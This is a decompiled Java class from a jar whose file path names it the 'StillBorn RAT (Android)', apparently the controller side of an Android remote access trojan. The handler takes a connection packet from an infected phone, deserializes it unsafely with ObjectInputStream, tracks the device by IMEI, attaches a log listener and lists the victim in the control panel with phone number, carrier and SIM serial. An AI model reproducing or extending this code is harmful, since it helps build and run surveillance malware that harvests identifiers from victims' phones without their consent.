/*   1:    */ package handler;
/*   2:    */ 
/*   3:    */ import Packet.CommandPacket;
/*   4:    */ import Packet.LogPacket;
/*   5:    */ import Packet.Packet;
/*   6:    */ import gui.GUI;
/*   7:    */ import java.io.ByteArrayInputStream;
/*   8:    */ import java.io.ObjectInputStream;
/*   9:    */ import java.util.HashMap;
/*  10:    */ import java.util.Hashtable;
/*  11:    */ import server.ClientHandler;
/*  12:    */ import server.Server;
/*  13:    */ 
/*  14:    */ public class CommandHandler
/*  15:    */   implements PacketHandler
/*  16:    */ {
/*  17:    */   private short command;
/*  18:    */   private byte[] arg;
/*  19:    */   
/*  20:    */   public void handlePacket(Packet p, String temp_imei, Server c)
/*  21:    */   {
/*  22: 52 */     this.command = ((CommandPacket)p).getCommand();
/*  23: 53 */     this.arg = ((CommandPacket)p).getArguments();
/*  24: 55 */     switch (this.command)
/*  25:    */     {
/*  26:    */     case 2: 
/*  27: 61 */       ByteArrayInputStream bis = new ByteArrayInputStream(this.arg);
/*  28:    */       
/*  29: 63 */       Hashtable<String, String> h = null;
/*  30:    */       try
/*  31:    */       {
/*  32: 65 */         ObjectInputStream in = new ObjectInputStream(bis);
/*  33: 66 */         h = (Hashtable)in.readObject();
/*  34:    */       }
/*  35:    */       catch (Exception e)
/*  36:    */       {
/*  37: 68 */         e.printStackTrace();
/*  38:    */       }
/*  39: 70 */       String new_imei = (String)h.get("IMEI");
/*  40:    */       
/*  41: 72 */       c.getGui().logTxt("Bağlantı komutu alındı: " + new_imei);
/*  42: 74 */       if (!c.getClientMap().containsKey(new_imei))
/*  43:    */       {
/*  44: 78 */         ClientHandler ch = (ClientHandler)c.getClientMap().get(temp_imei);
/*  45: 79 */         ChannelDistributionHandler cdh = (ChannelDistributionHandler)c.getChannelHandlerMap().get(temp_imei);
/*  46:    */         
/*  47: 81 */         ch.updateIMEI(new_imei);
/*  48:    */         
/*  49:    */ 
/*  50: 84 */         c.getClientMap().remove(temp_imei);
/*  51: 85 */         c.getChannelHandlerMap().remove(temp_imei);
/*  52:    */         
/*  53:    */ 
/*  54:    */ 
/*  55: 89 */         c.getClientMap().put(new_imei, ch);
/*  56: 90 */         c.getChannelHandlerMap().put(new_imei, cdh);
/*  57:    */         
/*  58:    */ 
/*  59: 93 */         ((ChannelDistributionHandler)c.getChannelHandlerMap().get(new_imei)).registerListener(1, new LogPacket());
/*  60: 94 */         ((ChannelDistributionHandler)c.getChannelHandlerMap().get(new_imei)).registerHandler(1, new ClientLogHandler(1, new_imei, c.getGui()));
/*  61:    */       }
/*  62:    */       else
/*  63:    */       {
/*  64:100 */         ClientHandler ch1 = (ClientHandler)c.getClientMap().get(temp_imei);
/*  65:    */         
/*  66:102 */         ChannelDistributionHandler cdh1 = (ChannelDistributionHandler)c.getChannelHandlerMap().get(new_imei);
/*  67:    */         
/*  68:    */ 
/*  69:105 */         c.getClientMap().remove(temp_imei);
/*  70:106 */         c.getChannelHandlerMap().remove(temp_imei);
/*  71:    */         
/*  72:108 */         c.getChannelHandlerMap().remove(new_imei);
/*  73:    */         
/*  74:    */ 
/*  75:111 */         c.getClientMap().put(new_imei, ch1);
/*  76:112 */         c.getChannelHandlerMap().put(new_imei, cdh1);
/*  77:    */       }
/*  78:116 */       c.getGui().addUser(new_imei, (String)h.get("Country"), (String)h.get("PhoneNumber"), (String)h.get("Operator"), (String)h.get("SimCountry"), (String)h.get("SimOperator"), (String)h.get("SimSerial"));
/*  79:    */     }
/*  80:    */   }
/*  81:    */   
/*  82:    */   public void receive(Packet p, String imei) {}
/*  83:    */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     handler.CommandHandler
 * JD-Core Version:    0.7.0.1
 */